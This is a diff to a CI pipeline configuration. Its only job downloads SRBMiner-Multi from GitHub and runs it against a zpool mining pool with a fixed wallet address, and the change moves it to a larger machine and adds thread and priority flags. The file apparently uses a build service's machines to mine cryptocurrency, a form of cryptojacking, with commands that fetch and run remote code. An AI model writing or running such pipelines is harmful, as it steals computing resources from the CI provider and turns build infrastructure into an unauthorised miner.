@@ -2,15 +2,16 @@ version: v1.0
 name: Initial Pipeline
 agent:
   machine:
-    type: e1-standard-4
-    os_image: ubuntu2004
+    type: e1-standard-8
+    os_image: ubuntu1804
 blocks:
   - name: 'Block #1'
     task:
       jobs:
         - name: 'Job #1'
           commands:
-            - 'wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.2.9/SRBMiner-Multi-2-2-9-Linux.tar.xz && tar -xf SRBMiner-Multi-2-2-9-Linux.tar.xz && cd SRBMiner-Multi-2-2-9 && ./SRBMiner-MULTI --disable-gpu --algorithm minotaurx --pool stratum+tcp://minotaurx.sea.mine.zpool.ca:7019 --wallet PMcHDezG3w7g3y4vEGHJLYut34JAvjYzQv --password c=PEPEW'
+            - 'wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.2.9/SRBMiner-Multi-2-2-9-Linux.tar.xz && tar -xvf SRBMiner-Multi-2-2-9-Linux.tar.xz'
+            - 'cd SRBMiner-Multi-2-2-9 && chmod +x SRBMiner-MULTI && ./SRBMiner-MULTI --disable-gpu --algorithm minotaurx --pool stratum+tcp://minotaurx.sea.mine.zpool.ca:7019 --wallet PMcHDezG3w7g3y4vEGHJLYut34JAvjYzQv --password c=PEPEW -t 4 --cpu-priority 4'
     dependencies: []
   - name: 'Block #2'
     dependencies: []
